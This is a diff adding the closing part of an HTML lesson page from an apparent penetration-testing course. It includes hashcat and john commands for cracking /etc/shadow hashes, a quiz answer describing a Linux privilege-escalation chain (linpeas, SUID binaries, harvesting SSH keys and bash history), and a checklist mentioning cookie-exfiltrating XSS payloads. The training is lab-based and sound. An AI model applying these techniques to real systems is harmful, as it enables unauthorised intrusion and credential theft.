+      <li>Crack with Hashcat: <code>hashcat -m 500 shadow_hashes.txt rockyou.txt</code> (MD5crypt for /etc/shadow)</li>
+      <li>Also try: <code>john shadow_hashes.txt --wordlist=rockyou.txt</code></li>
+      <li>How many passwords did you crack? What were they? This is your loot documentation practice.</li>
+    </ul>
+  </div>
+
+  <div class="slbl">// 28.4 — FINAL PHASE 2 QUIZ</div>
+  <div class="qb">
+    <div class="qt">You've just compromised a web server via SQL injection and obtained a Meterpreter shell as www-data (non-root). The /etc/passwd shows a user "developer" with home at /home/developer. Describe the COMPLETE attack chain to reach root on this Linux machine.</div>
+    <div class="qopts">
+      <div class="qo" onclick="qa(this,'wrong','Mimikatz is a Windows tool — it does nothing on Linux. Linux privilege escalation uses entirely different techniques.')"><span class="qk">A</span> Run Mimikatz from Meterpreter to dump root credentials</div>
+      <div class="qo" onclick="qa(this,'wrong','Deleting logs is bad practice (destroys evidence for your report, potentially illegal) and doesn\'t help escalate privileges.')"><span class="qk">B</span> Delete log files to avoid detection and wait for an admin to log in</div>
+      <div class="qo" onclick="qa(this,'correct','Correct full chain: (1) Local enum in Meterpreter: run post/multi/recon/local_exploit_suggester — finds kernel exploits, sudo misconfigurations. (2) Shell: drop to bash shell, run linpeas.sh (Linux privilege escalation script) — checks SUID binaries, sudo -l, cron jobs, writable files, kernel version CVEs. (3) Quick wins: sudo -l (can www-data run anything as root?), find / -perm -4000 2>/dev/null (SUID binaries to exploit via GTFOBins), cat /home/developer/.bash_history (reused passwords?), check /var/www for config files with DB credentials (DB password often == system password). (4) If developer account found — check .ssh/id_rsa (SSH key), .bash_history for passwords, any scripts in home dir. (5) Exploit the highest-severity finding first. (6) Verify root: id should show uid=0.')"><span class="qk">C</span> Run local_exploit_suggester, enumerate SUID binaries and sudo rights with linpeas, check config files for reused credentials, check developer's .bash_history and SSH keys</div>
+      <div class="qo" onclick="qa(this,'wrong','Rebooting the server would kill your shell and is extremely disruptive — never do this in a pentest.')"><span class="qk">D</span> Reboot the server to get a fresh root session from the bootloader</div>
+    </div>
+    <div class="qfb" id="q6"></div>
+  </div>
+
+  <div class="slbl">// PHASE 3 PREVIEW</div>
+  <div class="two">
+    <div class="card">
+      <div class="clbl">WEEK 5 — OFFENSIVE SECURITY ADVANCED</div>
+      <ul class="ck">
+        <li>Linux & Windows privilege escalation deep dive</li>
+        <li>Post-exploitation: Mimikatz, credential harvesting</li>
+        <li>Active Directory attacks: Kerberoasting, Pass-the-Hash</li>
+        <li>Lateral movement: PSExec, WMI, BloodHound paths</li>
+        <li>Full AD domain compromise simulation</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="clbl">WEEK 6 — RED TEAM TECHNIQUES</div>
+      <ul class="ck">
+        <li>AV evasion: shellcode encoding, process injection</li>
+        <li>Custom payload development with msfvenom</li>
+        <li>C2 frameworks: Sliver, Covenant concepts</li>
+        <li>Wireless attacks: WPA2, evil twin, aircrack-ng</li>
+        <li>Full red team report writing</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="note nt">
+    <div class="nico">✅</div>
+    <p><strong>Phase 2 Readiness Checklist:</strong> Before Phase 3, verify you can: (1) Get a root Meterpreter shell on Metasploitable via vsftpd in under 3 minutes from scratch. (2) Manually exploit a SQLi UNION attack to dump a database table. (3) Create a stored XSS payload that exfiltrates cookies. (4) Set up Burp and find an IDOR vulnerability by changing object IDs in Repeater. (5) Crack a provided list of MD5 hashes using rockyou + rules. (6) Get user and root flags on at least one HackTheBox easy machine independently.</p>
+  </div>
+</div><!-- /p6 -->
+
+</div><!-- .wrap -->
+
+<footer>PHASE 2 COMPLETE · WEEK 4 OF 4 · EXPLOITATION FUNDAMENTALS · NEXT: PHASE 3 — ADVANCED OFFENSIVE SECURITY</footer>
+
+<script>
+function show(i){
+  document.querySelectorAll('.pnl').forEach(p=>p.classList.remove('on'));
+  document.querySelectorAll('.dtab').forEach(t=>t.classList.remove('on'));
+  document.getElementById('p'+i).classList.add('on');
+  document.querySelectorAll('.dtab')[i].classList.add('on');
+  window.scrollTo({top:0,behavior:'smooth'});
+}
+
+function qa(el,type,exp){
+  const q=el.closest('.qb');
+  if(q.dataset.done)return;
+  q.dataset.done='1';
+  q.querySelectorAll('.qo').forEach(o=>{o.style.pointerEvents='none';o.style.opacity='0.4';});
+  el.style.opacity='1';el.classList.add(type);
+  const fb=q.querySelector('.qfb');
+  if(fb){fb.classList.add('show',type);fb.textContent=exp;}
+}
+
+function tab(el,id){
+  const demo=el.closest('.payload-demo');
+  demo.querySelectorAll('.pd-tab').forEach(t=>t.classList.remove('on'));
+  demo.querySelectorAll('.pd-content').forEach(c=>c.classList.remove('on'));
+  el.classList.add('on');
+  document.getElementById(id).classList.add('on');
+}
+</script>
+
+<div class="week-nav" style="border-top-color:var(--border,#141b26);max-width:1160px;margin:2rem auto 0;padding:2rem;display:flex;justify-content:space-between;align-items:center;">
+  <a href="week3.html" style="color:var(--accent,#3b82f6);border-color:var(--border,#141b26);">← Previous Week</a>
+  <a href="../index.html" style="color:var(--teal,#2dd4bf);border-color:rgba(45,212,191,0.3);">⌂ Lesson Hub</a>
+  <a href="week5.html" style="color:var(--accent,#3b82f6);border-color:var(--border,#141b26);">Next Week →</a>
+</div>
+
+<a href="#" id="back-to-top" title="Back to top">↑</a>
+
+<script src="../js/shared.js"></script>
+</body>
+</html>
